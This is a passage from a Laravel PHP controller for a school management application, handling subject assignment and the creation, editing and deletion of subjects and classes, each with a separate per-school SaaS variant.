            $classes = AramiscClass::where('active_status', 1)->where('school_id',$school_id)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['classes'] = $classes->toArray();
                $data['assign_subjects'] = $assign_subjects->toArray();
                $data['teachers'] = $teachers->toArray();
                $data['subjects'] = $subjects->toArray();
                $data['class_id'] = $class_id;
                $data['section_id'] = $section_id;
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.academics.assign_subject_create', compact('classes', 'assign_subjects', 'teachers', 'subjects', 'class_id', 'section_id'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function assign_Subject_Create(Request $request)
    {

        try {
            $classes = AramiscClass::where('active_status', 1)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($classes, null);
            }
            return view('backEnd.academics.assign_subject_create', compact('classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_assign_Subject_Create(Request $request,$school_id)
    {

        try {
            $classes = AramiscClass::where('active_status', 1)->where('school_id',$school_id)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($classes, null);
            }
            return view('backEnd.academics.assign_subject_create', compact('classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function assignSubjectStore(Request $request)
    {


        try {
            if ($request->update == 0) {
                $i = 0;
                if (isset($request->subjects)) {
                    foreach ($request->subjects as $subject) {
                        if ($subject != "") {
                            $assign_subject = new AramiscAssignSubject();
                            $assign_subject->class_id = $request->class_id;
                            $assign_subject->section_id = $request->section_id;
                            $assign_subject->subject_id = $subject;
                            $assign_subject->teacher_id = $request->teachers[$i];
                            $assign_subject->save();
                            $i++;
                        }
                    }
                }
            } elseif ($request->update == 1) {
                $assign_subjects = AramiscAssignSubject::where('class_id', $request->class_id)->where('section_id', $request->section_id)->delete();

                $i = 0;
                if (isset($request->subjects)) {
                    foreach ($request->subjects as $subject) {

                        if ($subject != "") {
                            $assign_subject = new AramiscAssignSubject();
                            $assign_subject->class_id = $request->class_id;
                            $assign_subject->section_id = $request->section_id;
                            $assign_subject->subject_id = $subject;
                            $assign_subject->teacher_id = $request->teachers[$i];
                            $assign_subject->save();
                            $i++;
                        }
                    }
                }
            }


            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse(null, 'Record Updated Successfully');
            }
            return redirect()->back()->with('message-success', 'Record Updated Successfully');
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_assignSubjectStore(Request $request, $school_id)
    {


        try {
            if ($request->update == 0) {
                $i = 0;
                if (isset($request->subjects)) {
                    foreach ($request->subjects as $subject) {
                        if ($subject != "") {
                            $assign_subject = new AramiscAssignSubject();
                            $assign_subject->class_id = $request->class_id;
                            $assign_subject->section_id = $request->section_id;
                            $assign_subject->subject_id = $subject;
                            $assign_subject->teacher_id = $request->teachers[$i];
                            $assign_subject->school_id = $school_id;
                            $assign_subject->save();
                            $i++;
                        }
                    }
                }
            } elseif ($request->update == 1) {
                $assign_subjects = AramiscAssignSubject::where('class_id', $request->class_id)->where('section_id', $request->section_id)->where('school_id',$school_id)->delete();

                $i = 0;
                if (isset($request->subjects)) {
                    foreach ($request->subjects as $subject) {

                        if ($subject != "") {
                            $assign_subject = new AramiscAssignSubject();
                            $assign_subject->class_id = $request->class_id;
                            $assign_subject->section_id = $request->section_id;
                            $assign_subject->subject_id = $subject;
                            $assign_subject->teacher_id = $request->teachers[$i];
                            $assign_subject->school_id = $school_id;
                            $assign_subject->save();
                            $i++;
                        }
                    }
                }
            }


            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse(null, 'Record Updated Successfully');
            }
            return redirect()->back()->with('message-success', 'Record Updated Successfully');
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function assignSubject_Create(Request $request)
    {

        try {
            $classes = AramiscClass::where('active_status', 1)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($classes, null);
            }
            return view('backEnd.academics.assign_subject_create', compact('classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_assignSubject_Create(Request $request, $school_id)
    {

        try {
            $classes = AramiscClass::where('active_status', 1)->where('school_id',$school_id)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($classes, null);
            }
            return view('backEnd.academics.assign_subject_create', compact('classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function assignSubjectFind(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'class' => 'required',
            'section' => 'required'
        ]);
        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $assign_subjects = AramiscAssignSubject::where('class_id', $request->class)->where('section_id', $request->section)->get();
            $subjects = AramiscSubject::where('active_status', 1)->get();
            $teachers = AramiscStaff::where('active_status', 1)->where(function($q)  {
                $q->where('role_id', 4)->orWhere('previous_role_id', 4);
            })->get();
            $classes = AramiscClass::where('active_status', 1)->get();
            if ($assign_subjects->count() == 0) {
                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    return ApiBaseMethod::sendError('No Result Found');
                }
                return redirect()->back()->with('message-danger', 'No Result Found');
            } else {
                $class_id = $request->class;

                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    $data = [];
                    $data['classes'] = $classes->toArray();
                    $data['assign_subjects'] = $assign_subjects->toArray();
                    $data['teachers'] = $teachers->toArray();
                    $data['subjects'] = $subjects->toArray();
                    $data['class_id'] = $class_id;
                    return ApiBaseMethod::sendResponse($data, null);
                }
                return view('backEnd.academics.assign_subject', compact('classes', 'assign_subjects', 'teachers', 'subjects', 'class_id'));
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_assignSubjectFind(Request $request, $school_id)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'class' => 'required',
            'section' => 'required'
        ]);
        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $assign_subjects = AramiscAssignSubject::where('class_id', $request->class)->where('section_id', $request->section)->where('school_id',$school_id)->get();
            $subjects = AramiscSubject::where('active_status', 1)->where('school_id',$school_id)->get();
            $teachers = AramiscStaff::where('active_status', 1)->where(function($q)  {
                $q->where('role_id', 4)->orWhere('previous_role_id', 4);
            })->where('school_id',$school_id)->get();
            $classes = AramiscClass::where('active_status', 1)->where('school_id',$school_id)->get();
            if ($assign_subjects->count() == 0) {
                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    return ApiBaseMethod::sendError('No Result Found');
                }
                return redirect()->back()->with('message-danger', 'No Result Found');
            } else {
                $class_id = $request->class;

                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    $data = [];
                    $data['classes'] = $classes->toArray();
                    $data['assign_subjects'] = $assign_subjects->toArray();
                    $data['teachers'] = $teachers->toArray();
                    $data['subjects'] = $subjects->toArray();
                    $data['class_id'] = $class_id;
                    return ApiBaseMethod::sendResponse($data, null);
                }
                return view('backEnd.academics.assign_subject', compact('classes', 'assign_subjects', 'teachers', 'subjects', 'class_id'));
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function assignSubjectAjax(Request $request)
    {

        try {
            $subjects = AramiscSubject::where('active_status', 1)->get();
            $teachers = AramiscStaff::where('active_status', 1)->where(function($q)  {
                $q->where('role_id', 4)->orWhere('previous_role_id', 4);
                })->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['subjects'] = $subjects->toArray();
                $data['teachers'] = $teachers->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return response()->json([$subjects, $teachers]);
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_assignSubjectAjax(Request $request, $school_id)
    {

        try {
            $subjects = AramiscSubject::where('active_status', 1)->where('school_id',$school_id)->get();
            $teachers = AramiscStaff::where('active_status', 1)->where(function($q)  {
                $q->where('role_id', 4)->orWhere('previous_role_id', 4);
            })->where('school_id',$school_id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['subjects'] = $subjects->toArray();
                $data['teachers'] = $teachers->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return response()->json([$subjects, $teachers]);
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function subject_index(Request $request)
    {

        try {
            $subjects = AramiscSubject::where('active_status', 1)->orderBy('id', 'DESC')->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($subjects, null);
            }
            return view('backEnd.academics.subject', compact('subjects'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_subject_index(Request $request, $school_id)
    {

        try {
            $subjects = AramiscSubject::where('active_status', 1)->orderBy('id', 'DESC')->where('school_id',$school_id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($subjects, null);
            }
            return view('backEnd.academics.subject', compact('subjects'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function subject_store(Request $request)
    {
        $input = $request->all();
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $validator = Validator::make($input, [
                'subject_name' => "required|max:200|unique:aramisc_subjects",
                'subject_type' => "required",
                'subject_code' => "sometimes|nullable|max:30",
            ]);
        } else {
            $validator = Validator::make($input, [
                'subject_name' => "required|max:200|unique:aramisc_subjects",
                'subject_type' => "required",
                'subject_code' => "required|nullable|max:30",
            ]);
        }
        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }

        try {
            $subject = new AramiscSubject();
            $subject->subject_name = $request->subject_name;
            $subject->subject_type = $request->subject_type;
            $subject->subject_code = $request->subject_code;
            $result = $subject->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Subject has been created successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');

                    return redirect()->back();
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_subject_store(Request $request)
    {
        $input = $request->all();
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $validator = Validator::make($input, [
                'subject_name' => "required|max:200|unique:aramisc_subjects",
                'subject_type' => "required",
                'subject_code' => "sometimes|nullable|max:30",
                'school_id' => "required",
            ]);
        } else {
            $validator = Validator::make($input, [
                'subject_name' => "required|max:200|unique:aramisc_subjects",
                'subject_type' => "required",
                'subject_code' => "required|nullable|max:30",
                'school_id' => "required",
            ]);
        }
        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }

        try {
            $subject = new AramiscSubject();
            $subject->subject_name = $request->subject_name;
            $subject->subject_type = $request->subject_type;
            $subject->subject_code = $request->subject_code;
            $subject->school_id = $request->school_id;
            $result = $subject->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Subject has been created successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');

                    return redirect()->back();
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function subject_edit(Request $request, $id)
    {

        try {
            $subject = AramiscSubject::find($id);
            $subjects = AramiscSubject::where('active_status', 1)->orderBy('id', 'DESC')->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['subject'] = $subject->toArray();
                $data['subjects'] = $subjects->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.academics.subject', compact('subject', 'subjects'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_subject_edit(Request $request,$school_id, $id)
    {

        try {
            $subject = AramiscSubject::where('school_id',$school_id)->find($id);
            $subjects = AramiscSubject::where('active_status', 1)->orderBy('id', 'DESC')->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['subject'] = $subject->toArray();
                $data['subjects'] = $subjects->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.academics.subject', compact('subject', 'subjects'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function subject_update(Request $request)
    {
        $input = $request->all();

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $validator = Validator::make($input, [
                'subject_name' => "required|max:200|unique:aramisc_subjects,subject_name," . $request->id,
                'subject_type' => "required",
                'subject_code' => "required|nullable|max:30",
            ]);
        } else {
            $validator = Validator::make($input, [
                'subject_name' => "required|max:200|unique:aramisc_subjects,subject_name," . $request->id,
                'subject_type' => "required",
                'subject_code' => "required|nullable|max:30",
            ]);
        }
        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }

        try {
            $subject = AramiscSubject::find($request->id);
            $subject->subject_name = $request->subject_name;
            $subject->subject_type = $request->subject_type;
            $subject->subject_code = $request->subject_code;
            $result = $subject->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Subject has been updated successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');

                    return redirect()->back();
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_subject_update(Request $request)
    {
        $input = $request->all();

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $validator = Validator::make($input, [
                'subject_name' => "required|max:200|unique:aramisc_subjects,subject_name," . $request->id,
                'subject_type' => "required",
                'subject_code' => "required|nullable|max:30",
                'school_id' => "required",
            ]);
        } else {
            $validator = Validator::make($input, [
                'subject_name' => "required|max:200|unique:aramisc_subjects,subject_name," . $request->id,
                'subject_type' => "required",
                'subject_code' => "required|nullable|max:30",
                'school_id' => "required",
            ]);
        }
        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }

        try {
            $subject = AramiscSubject::where('school_id',$request->school_id)->find($request->id);
            $subject->subject_name = $request->subject_name;
            $subject->subject_type = $request->subject_type;
            $subject->subject_code = $request->subject_code;
            $subject->school_id = $request->school_id;
            $result = $subject->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Subject has been updated successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');

                    return redirect()->back();
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function subject_delete(Request $request, $id)
    {
        try {
            $column_name = 'subject_id';

            $column_name = 'subject_id';
            $tables = tableList::ONLY_TABLE_LIST($column_name);
            foreach ($tables as $table) {
                try {
                    DB::statement('SET FOREIGN_KEY_CHECKS=0;');
                    DB::table($table)->where($column_name, '=', $id)->delete();
                } catch (\Illuminate\Database\QueryException $e) {
                    $msg = 'Ops! Something went wrong. You are not allowed to remove this class.';
                    Toastr::error($msg, 'Failed');
                    return redirect()->back();
                }
            } //end foreach

            try {
                $result = $delete_query = AramiscSubject::destroy($request->id);

                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    if ($result) {
                        return ApiBaseMethod::sendResponse(null, 'Subject has been deleted successfully');
                    } else {
                        return ApiBaseMethod::sendError('Something went wrong, please try again.');
                    }
                } else {
                    if ($delete_query) {
                        Toastr::success('Operation successful', 'Success');

                        return redirect()->back();
                    } else {
                        Toastr::error('Operation Failed', 'Failed');
                        return redirect()->back();
                    }
                }
            } catch (\Illuminate\Database\QueryException $e) {
                $msg = 'This data already used in  : ' . $tables . ' Please remove those data first';
                Toastr::error('This item already used', 'Failed');
                return redirect()->back();
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_subject_delete(Request $request,$school_id, $id)
    {
        try {
            $column_name = 'subject_id';

            $column_name = 'subject_id';
            $tables = tableList::ONLY_TABLE_LIST($column_name);
            foreach ($tables as $table) {
                try {
                    DB::statement('SET FOREIGN_KEY_CHECKS=0;');
                    DB::table($table)->where($column_name, '=', $id)->where('school_id',$school_id)->delete();
                } catch (\Illuminate\Database\QueryException $e) {
                    $msg = 'Ops! Something went wrong. You are not allowed to remove this class.';
                    Toastr::error($msg, 'Failed');
                    return redirect()->back();
                }
            } //end foreach

            try {
                $result = $delete_query = AramiscSubject::where('school_id',$school_id)->destroy($request->id);

                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    if ($result) {
                        return ApiBaseMethod::sendResponse(null, 'Subject has been deleted successfully');
                    } else {
                        return ApiBaseMethod::sendError('Something went wrong, please try again.');
                    }
                } else {
                    if ($delete_query) {
                        Toastr::success('Operation successful', 'Success');

                        return redirect()->back();
                    } else {
                        Toastr::error('Operation Failed', 'Failed');
                        return redirect()->back();
                    }
                }
            } catch (\Illuminate\Database\QueryException $e) {
                $msg = 'This data already used in  : ' . $tables . ' Please remove those data first';
                Toastr::error('This item already used', 'Failed');
                return redirect()->back();
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function class_index(Request $request)
    {
        try {
            $sections = AramiscSection::where('active_status', '=', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $classes = AramiscClass::where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('active_status', '=', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['classes'] = $classes->toArray();
                $data['sections'] = $sections->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.academics.class', compact('classes', 'sections'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_class_index(Request $request, $school_id)
    {
        try {
            $sections = AramiscSection::withoutGlobalScope(StatusAcademicSchoolScope::class)->where('active_status', '=', 1)->where('academic_id', AramiscAcademicYear::API_ACADEMIC_YEAR($school_id))->where('school_id',$school_id)->get();
            $classes = AramiscClass::withoutGlobalScope(StatusAcademicSchoolScope::class)->where('academic_id', AramiscAcademicYear::API_ACADEMIC_YEAR($school_id))->where('active_status', '=', 1)->where('school_id',$school_id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['classes'] = $classes->toArray();
                $data['sections'] = $sections->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.academics.class', compact('classes', 'sections'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function class_store(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make(
            $input,
            [
                'name' => "required|max:200|unique:aramisc_classes,class_name",
            ]
        );

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }

        DB::beginTransaction();

        try {
            $class = new AramiscClass();
            $class->class_name = $request->name;
            $class->created_at = YearCheck::getYear() . '-' . date('m-d h:i:s');
            $class->save();
            $class->toArray();
            try {
                $sections = $request->section;

                if ($sections != '') {
                    foreach ($sections as $section) {
                        $aramiscClassSection = new AramiscClassSection();
                        $aramiscClassSection->class_id = $class->id;
                        $aramiscClassSection->section_id = $section;
                        $aramiscClassSection->created_at = YearCheck::getYear() . '-' . date('m-d h:i:s');
                        $aramiscClassSection->save();
                    }
                }
                DB::commit();

                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    return ApiBaseMethod::sendResponse(null, 'Class has been created successfully');
                }
                Toastr::success('Operation successful', 'Success');
                return redirect()->back();
            } catch (\Exception $e) {
                DB::rollBack();
            }
        } catch (\Exception $e) {
            DB::rollBack();
        }
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            return ApiBaseMethod::sendError('Something went wrong, please try again.');
        }
        Toastr::error('Operation Failed', 'Failed');
        return redirect()->back();
    }
    public function saas_class_store(Request $request,$school_id)
    {
        $input = $request->all();
        $validator = Validator::make(
            $input,
            [
                'name' => "required|max:200|unique:aramisc_classes,class_name",
                'school_id' => "required",
            ]
        );

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }

        DB::beginTransaction();

        try {
            $class = new AramiscClass();
            $class->class_name = $request->name;
            $class->school_id = $request->school_id;
            $class->created_at = YearCheck::getYear() . '-' . date('m-d h:i:s');
            $class->save();
            $class->toArray();
            try {
                $sections = $request->section;

                if ($sections != '') {
                    foreach ($sections as $section) {
                        $aramiscClassSection = new AramiscClassSection();
                        $aramiscClassSection->class_id = $class->id;
                        $aramiscClassSection->section_id = $section;
                        $aramiscClassSection->school_id = $school_id;
                        $aramiscClassSection->created_at = YearCheck::getYear() . '-' . date('m-d h:i:s');
                        $aramiscClassSection->save();
                    }
                }
                DB::commit();

                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    return ApiBaseMethod::sendResponse(null, 'Class has been created successfully');
                }
                Toastr::success('Operation successful', 'Success');
                return redirect()->back();
            } catch (\Exception $e) {
                DB::rollBack();
            }
        } catch (\Exception $e) {
            DB::rollBack();
        }
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            return ApiBaseMethod::sendError('Something went wrong, please try again.');
        }
        Toastr::error('Operation Failed', 'Failed');
        return redirect()->back();
    }
    public function class_edit(Request $request, $id)
    {


        try {
            $classById = SmCLass::find($id);

            $sectionByNames = AramiscClassSection::select('section_id')->where('class_id', '=', $classById->id)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            $sectionId = array();
            foreach ($sectionByNames as $sectionByName) {
                $sectionId[] = $sectionByName->section_id;
            }

            $sections = AramiscSection::where('active_status', '=', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            $classes = AramiscClass::where('active_status', '=', 1)->orderBy('id', 'desc')->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['sections'] = $sections->toArray();
                $data['classes'] = $classes->toArray();
                $data['classById'] = $classById;
                $data['sectionId'] = $sectionId;
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.academics.class', compact('classById', 'classes', 'sections', 'sectionId'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_class_edit(Request $request,$school_id, $id)
    {

        try {
            $classById = SmCLass::where('school_id',$school_id)->find($id);

            $sectionByNames = AramiscClassSection::select('section_id')->where('class_id', '=', $classById->id)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();

            $sectionId = array();
            foreach ($sectionByNames as $sectionByName) {
                $sectionId[] = $sectionByName->section_id;
            }

            $sections = AramiscSection::where('active_status', '=', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();

            $classes = AramiscClass::where('active_status', '=', 1)->orderBy('id', 'desc')->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['sections'] = $sections->toArray();
                $data['classes'] = $classes->toArray();
                $data['classById'] = $classById;
                $data['sectionId'] = $sectionId;
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.academics.class', compact('classById', 'classes', 'sections', 'sectionId'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function class_update(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make(
            $input,
            [

                'name' => "required|max:200",
                'section' => 'required|array',
            ],
            [
                'section.required' => 'At least one checkbox required!'
            ]
        );

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }


        SmCLassSection::where('class_id', $request->id)->delete();


        DB::beginTransaction();

        try {
            $class = AramiscClass::find($request->id);
            $class->class_name = $request->name;
            $class->save();
            $class->toArray();
            try {
                $sections = $request->section;

                foreach ($sections as $section) {
                    $aramiscClassSection = new AramiscClassSection();
                    $aramiscClassSection->class_id = $class->id;
                    $aramiscClassSection->section_id = $section;
                    $aramiscClassSection->created_at = YearCheck::getYear() . '-' . date('m-d h:i:s');
                    $aramiscClassSection->save();
                }

                DB::commit();

                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    return ApiBaseMethod::sendResponse(null, 'Class has been updated successfully');
                }
                Toastr::success('Operation successful', 'Success');
                return redirect('class');
            } catch (\Exception $e) {
                DB::rollBack();
            }
        } catch (\Exception $e) {
            DB::rollBack();
        }

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            return ApiBaseMethod::sendError('Something went wrong, please try again.');
        }
        Toastr::error('Operation Failed', 'Failed');
        return redirect()->back();
    }
    public function saas_class_update(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make(
            $input,
            [

                'name' => "required|max:200",
                'section' => 'required|array',
                'school_id' => 'required',
            ],
            [
                'section.required' => 'At least one checkbox required!'
            ]
        );

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }


        SmCLassSection::where('class_id', $request->id)->where('school_id', $request->school_id)->delete();


        DB::beginTransaction();

        try {
            $class = AramiscClass::where('school_id', $request->school_id)->find($request->id);
            $class->class_name = $request->name;
            $class->save();
            $class->toArray();
            try {
                $sections = $request->section;

                foreach ($sections as $section) {
                    $aramiscClassSection = new AramiscClassSection();
                    $aramiscClassSection->class_id = $class->id;
                    $aramiscClassSection->section_id = $section;
                    $aramiscClassSection->created_at = YearCheck::getYear() . '-' . date('m-d h:i:s');
                    $aramiscClassSection->save();
                }

                DB::commit();

                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    return ApiBaseMethod::sendResponse(null, 'Class has been updated successfully');
                }
                Toastr::success('Operation successful', 'Success');
                return redirect('class');
            } catch (\Exception $e) {
                DB::rollBack();
            }
        } catch (\Exception $e) {
            DB::rollBack();
        }

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            return ApiBaseMethod::sendError('Something went wrong, please try again.');
        }
        Toastr::error('Operation Failed', 'Failed');
        return redirect()->back();
    }
    public function class_delete(Request $request, $id)
    {

        try {
            $column_name = 'class_id';
            $t = FALSE;
            $tables = tableList::ONLY_TABLE_LIST($column_name);
            foreach ($tables as $table) {
                try {
                    DB::statement('SET FOREIGN_KEY_CHECKS=0;');
                    $d = DB::table($table)->where($column_name, '=', $id)->update(['active_status' => 0]);
                } catch (\Illuminate\Database\QueryException $e) {
                    $tableName = $table;
                    if (!Schema::hasColumn($tableName, 'active_status')) {
